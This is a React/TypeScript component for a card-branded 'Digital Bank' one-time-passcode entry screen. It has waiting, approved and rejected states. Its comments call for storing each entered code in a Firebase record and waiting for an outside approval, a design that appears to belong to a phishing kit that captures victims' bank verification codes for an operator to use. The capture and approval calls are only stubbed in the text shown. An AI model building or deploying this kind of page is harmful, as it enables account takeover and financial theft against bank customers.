"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Input } from "@/components/ui/input"
import { Button } from "@/components/ui/button"
import { Loader2, CheckCircle2, XCircle, ShieldCheck } from "lucide-react"

type ApprovalStatus = "idle" | "waiting" | "approved" | "rejected"

export function VerificationCodeForm() {
  const [otp, setOtp] = useState("")
  const [status, setStatus] = useState<ApprovalStatus>("idle")
  const [error, setError] = useState("")

  // Simulate approval after submit (replace with real Firebase logic)
  useEffect(() => {
    if (status === "waiting") {
      const timer = setTimeout(() => {
        // Simulate approval - replace with real listenForApproval
        setStatus("approved")
      }, 3000)
      return () => clearTimeout(timer)
    }
  }, [status])

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()

    if (otp.length < 4) {
      setError("Please enter a valid OTP code")
      return
    }

    try {
      setStatus("waiting")
      setError("")
      // Replace with: await updateOtp(documentId, otp)
    } catch (err) {
      setStatus("idle")
      setError("An error occurred. Please try again.")
    }
  }

  const handleRetry = () => {
    setOtp("")
    setStatus("idle")
    setError("")
  }

  return (
    <div className="w-full max-w-[400px] shadow-2xl rounded-2xl overflow-hidden bg-white">
      {/* Blue Header */}
      <div className="bg-[#0d4a8a] px-6 py-5 flex items-center justify-between">
        <span className="text-white font-bold text-xl tracking-tight">Digital Bank</span>
        <svg width="60" height="20" viewBox="0 0 60 20" fill="none" xmlns="http://www.w3.org/2000/svg">
          <path d="M23.1 2.5L20.3 17.5H16.5L19.3 2.5H23.1Z" fill="white" />
          <path
            d="M38.5 2.8C37.7 2.5 36.4 2.2 34.8 2.2C30.5 2.2 27.5 4.4 27.5 7.5C27.4 9.8 29.6 11.1 31.2 11.9C32.9 12.7 33.5 13.2 33.5 13.9C33.5 15 32.1 15.5 30.9 15.5C29.1 15.5 28.2 15.3 26.7 14.6L26.1 14.3L25.5 18.2C26.6 18.7 28.5 19.1 30.5 19.1C35.1 19.1 38 17 38 13.6C38 11.8 36.9 10.4 34.4 9.3C32.9 8.5 32 8 32 7.2C32 6.5 32.8 5.8 34.5 5.8C35.9 5.7 36.9 6 37.7 6.4L38.1 6.6L38.5 2.8Z"
            fill="white"
          />
          <path
            d="M44.5 11.5C44.8 10.7 46.1 7.1 46.1 7.1C46.1 7.1 46.4 6.2 46.6 5.7L46.9 7C46.9 7 47.6 10.5 47.8 11.5H44.5ZM50.1 2.5H47.1C46.1 2.5 45.4 2.8 45 3.8L38.5 17.5H43.1L44 15H49.6L50.1 17.5H54.2L50.6 2.5H50.1Z"
            fill="white"
          />
          <path d="M14.3 2.5L10 12.6L9.5 10.1C8.7 7.5 6.2 4.6 3.4 3.1L7.4 17.5H12.1L19.1 2.5H14.3Z" fill="white" />
          <path d="M6.5 2.5H0.1L0 2.8C5.5 4.2 9.2 7.6 10.5 11.6L9.1 3.8C8.9 2.8 8.2 2.5 7.3 2.5H6.5Z" fill="#f9a533" />
        </svg>
      </div>

      {/* Form Content */}
      <div className="px-8 py-10">
        {/* Waiting State */}
        {status === "waiting" && (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <div className="relative">
              <Loader2 className="w-16 h-16 text-[#0d4a8a] animate-spin" />
            </div>
            <p className="text-lg font-semibold text-foreground">Verifying...</p>
            <p className="text-sm text-muted-foreground text-center">Please wait while we verify your OTP code</p>
          </div>
        )}

        {/* Approved State */}
        {status === "approved" && (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <CheckCircle2 className="w-16 h-16 text-green-500" />
            <p className="text-lg font-semibold text-green-700">Verification Successful!</p>
            <p className="text-sm text-muted-foreground text-center">Your identity has been verified</p>
          </div>
        )}

        {/* Rejected State */}
        {status === "rejected" && (
          <div className="flex flex-col items-center justify-center py-8 space-y-4">
            <XCircle className="w-16 h-16 text-red-500" />
            <p className="text-lg font-semibold text-red-700">Verification Failed</p>
            <p className="text-sm text-red-600 text-center">{error}</p>
            <Button
              onClick={handleRetry}
              variant="outline"
              className="mt-4 border-[#0d4a8a] text-[#0d4a8a] hover:bg-[#0d4a8a]/10 bg-transparent"
            >
              Try Again
            </Button>
          </div>
        )}

        {/* Idle State - Form */}
        {status === "idle" && (
          <form onSubmit={handleSubmit} className="space-y-6">
            <div className="flex items-center gap-2 mb-2">
              <ShieldCheck className="w-6 h-6 text-[#0d4a8a]" />
              <h1 className="text-foreground text-xl font-bold">Enter verification code</h1>
            </div>

            <p className="text-muted-foreground text-sm leading-relaxed">
              We sent you a verification code by text message to (123) xxx-xx12. You have 6 attempts.
            </p>

            <div className="space-y-2">
              <label className="block text-[#0d4a8a] text-sm font-semibold">Verification code</label>
              <Input
                type="tel"
                placeholder="Enter OTP code"
                value={otp}
                onChange={(e) => setOtp(e.target.value.replace(/\D/g, "").slice(0, 6))}
                className="h-14 text-center text-2xl font-mono tracking-widest border-2 rounded-xl focus:border-[#0d4a8a] focus-visible:ring-[#0d4a8a]/20"
                maxLength={6}
                autoFocus
              />
              {error && <p className="text-sm text-red-600 text-center">{error}</p>}
            </div>

            <Button
              type="submit"
              disabled={otp.length < 4}
              className="w-full h-12 bg-[#0d4a8a] hover:bg-[#083a54] text-white font-bold rounded-xl shadow-md hover:shadow-lg transition-all"
            >
              CONTINUE
            </Button>

            <p className="text-xs text-muted-foreground text-center">
              Didn't receive the code?{" "}
              <button type="button" className="text-[#0d4a8a] font-semibold hover:underline">
                RESEND CODE
              </button>
            </p>
          </form>
        )}
      </div>
    </div>
  )
}
